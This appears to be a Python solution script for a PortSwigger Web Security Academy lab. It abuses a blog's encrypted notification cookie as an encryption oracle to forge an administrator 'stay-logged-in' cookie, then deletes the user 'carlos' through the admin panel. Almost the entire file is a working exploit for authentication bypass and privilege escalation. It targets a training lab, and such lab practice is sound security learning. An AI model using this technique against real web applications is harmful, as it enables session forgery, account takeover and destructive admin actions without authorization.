import base64
import requests
import urllib.parse
from bs4 import BeautifulSoup

# ---------------------------------------------------------------------------
# Fetch and return the CSRF token from the specified URL using the given session.
# ---------------------------------------------------------------------------
def get_csrf_token(session: requests.Session, url: str) -> str:
    response = session.get(url)
    if not response.ok:
        raise Exception(f"Failed to load page: {url}")
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    if not csrf_input or not csrf_input.get('value'):
        raise Exception("CSRF token not found.")
    return csrf_input.get('value')

# ---------------------------------------------------------------------------
# Submit an invalid comment on post 1 and return the notification cookie.
# ---------------------------------------------------------------------------
def submit_invalid_comment(session: requests.Session, blog_post: str, blog_post_url: str, comment_url: str) -> str:
    try:
        csrf_token = get_csrf_token(session, blog_post_url)
        print("CSRF:", csrf_token)
    except Exception as e:
        print("Error:", e)
        exit(1)
    
    payload = {
        "csrf": csrf_token,
        "postId": "1",
        "comment": "Invalid comment!",
        "name": "hackerman",
        "email": "hackerman",
        "website": ""
    }
    print("Payload:", payload)
    
    comment_response = session.post(comment_url, data=payload, allow_redirects=False)
    redirect_location = comment_response.headers.get("Location")
    if redirect_location == blog_post:
        notification_cookie = session.cookies.get("notification")
        print("Invalid comment sent.\nNotification cookie:", notification_cookie)
        return notification_cookie
    else:
        print("Failed to submit invalid comment.")
        exit(1)

# ---------------------------------------------------------------------------
# Create a new session.
# ---------------------------------------------------------------------------
session = requests.Session()

# ---------------------------------------------------------------------------
# Define Lab URLs.
# ---------------------------------------------------------------------------
base_url = "https://0aa600d404d7d6ee838b415000e600b7.web-security-academy.net"
login_url = f"{base_url}/login"
blog_post = "/post?postId=1"
blog_post_url = f"{base_url}{blog_post}"
comment_url = f"{base_url}/post/comment"
admin_delete_url = f"{base_url}/admin/delete?username=carlos"

# ---------------------------------------------------------------------------
# Define Lab User Credentials.
# ---------------------------------------------------------------------------
username = "wiener"
password = "peter"

# ---------------------------------------------------------------------------
# Log in with "Stay Logged In".
# ---------------------------------------------------------------------------
try:
    csrf_token = get_csrf_token(session, login_url)
except Exception as e:
    print("Error:", e)
    exit(1)

payload = {
    "csrf": csrf_token,
    "username": username,
    "password": password,
    "stay-logged-in": "on"
}

login_response = session.post(login_url, data=payload)
if login_response.ok:
    print("Login successful")
    for cookie in session.cookies:
        print(f"{cookie.name}: {cookie.value}")
else:
    print("Failed login.")
    exit(1)

# ---------------------------------------------------------------------------
# Leave an invalid comment on post 1.
# ---------------------------------------------------------------------------
notification_cookie = submit_invalid_comment(session, blog_post, blog_post_url, comment_url)

# ---------------------------------------------------------------------------
# Retrieve the value of the 'stay-logged-in' cookie.
# ---------------------------------------------------------------------------
stay_logged_in = session.cookies.get("stay-logged-in")
print("Stay-logged-in cookie:", stay_logged_in)

# ---------------------------------------------------------------------------
# Clear all cookies named 'notification' to avoid conflict, then set it to 'stay-logged-in'.
# ---------------------------------------------------------------------------
for cookie in list(session.cookies):
    if cookie.name == "notification":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)
session.cookies.set("notification", stay_logged_in)
print("Modified notification cookie:", session.cookies.get("notification"))

# ---------------------------------------------------------------------------
# Resume the redirect manually by sending a GET request with the modified cookie.
# ---------------------------------------------------------------------------
decrypt_response = session.get(blog_post_url)
soup = BeautifulSoup(decrypt_response.text, 'html.parser')
notification_header = soup.find('header', class_='notification-header')
decrypted_text = notification_header.get_text(strip=True)
print("\nDecrypted response:")
print(decrypted_text)

# ---------------------------------------------------------------------------
# Extract the timestamp from the decrypted response.
# ---------------------------------------------------------------------------
parts = decrypted_text.split(':')
if len(parts) == 2:
    timestamp = parts[1]
    new_value = f"xxxxxxxxxadministrator:{timestamp}"
    print(new_value)
else:
    print("Invalid decrypted data format.")
    exit(1)

# ---------------------------------------------------------------------------
# Encrypt the new administrator timestamp email value.
# ---------------------------------------------------------------------------
try:
    csrf_token = get_csrf_token(session, blog_post_url)
    print("CSRF:", csrf_token)
except Exception as e:
    print("Error:", e)
    exit(1)

payload = {
    "csrf": csrf_token,
    "postId": "1",
    "comment": "Invalid comment!",
    "name": "hackerman",
    "email": new_value,
    "website": ""
}
print("Payload:", payload)

# Clear all 'notification' cookies to avoid conflict.
for cookie in list(session.cookies):
    if cookie.name == "notification":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)

# Suppress the redirect to capture the notification cookie.
comment_response = session.post(comment_url, data=payload, allow_redirects=False)
redirect_location = comment_response.headers.get("Location")
if redirect_location == blog_post:
    notification_cookie = session.cookies.get("notification")
    print("Invalid comment sent.\nNotification cookie:", notification_cookie)
else:
    print("Failed to submit invalid comment.")
    exit(1)

# ---------------------------------------------------------------------------
# Resume the redirect manually by sending a GET request with the modified cookie.
# ---------------------------------------------------------------------------
decrypt_response = session.get(blog_post_url)
soup = BeautifulSoup(decrypt_response.text, 'html.parser')
notification_header = soup.find('header', class_='notification-header')
decrypted_text = notification_header.get_text(strip=True)
print("\nDecrypted response:")
print(decrypted_text)

# ---------------------------------------------------------------------------
# Process the notification cookie:
#   1. URL-decode the cookie.
#   2. Base64-decode the result.
#   3. Remove the first 32 bytes.
#   4. Base64-encode the modified bytes.
#   5. URL-encode the base64 encoded string.
# ---------------------------------------------------------------------------
decoded_cookie = urllib.parse.unquote(notification_cookie)
decoded_bytes = base64.b64decode(decoded_cookie)
modified_bytes = decoded_bytes[32:]
reencoded = base64.b64encode(modified_bytes)
final_value = urllib.parse.quote(reencoded.decode('utf-8'))
print("\nFinal modified notification cookie value:")
print(final_value)

# ---------------------------------------------------------------------------
# Leave an invalid comment on post 1 again.
# ---------------------------------------------------------------------------
notification_cookie = submit_invalid_comment(session, blog_post, blog_post_url, comment_url)

# ---------------------------------------------------------------------------
# Clear all 'notification' cookies and set it to the encrypted admin value.
# ---------------------------------------------------------------------------
for cookie in list(session.cookies):
    if cookie.name == "notification":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)
session.cookies.set("notification", final_value)
print("Modified notification cookie:", session.cookies.get("notification"))

# ---------------------------------------------------------------------------
# Resume the redirect manually by sending a GET request with the modified cookie.
# ---------------------------------------------------------------------------
decrypt_response = session.get(blog_post_url)
soup = BeautifulSoup(decrypt_response.text, 'html.parser')
notification_header = soup.find('header', class_='notification-header')
decrypted_text = notification_header.get_text(strip=True)
print("\nDecrypted response:")
print(decrypted_text)

# ---------------------------------------------------------------------------
# Remove the 'session' and 'stay-logged-in' cookies.
# ---------------------------------------------------------------------------
for cookie in list(session.cookies):
    if cookie.name == "session":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)
    if cookie.name == "stay-logged-in":
        session.cookies.clear(cookie.domain, cookie.path, cookie.name)

# ---------------------------------------------------------------------------
# Set a new 'stay-logged-in' cookie with the encrypted value.
# ---------------------------------------------------------------------------
session.cookies.set("stay-logged-in", final_value)

# ---------------------------------------------------------------------------
# Access the admin page to delete user 'carlos'.
# ---------------------------------------------------------------------------
session.get(admin_delete_url)
print("Lab completed. User carlos deleted.")
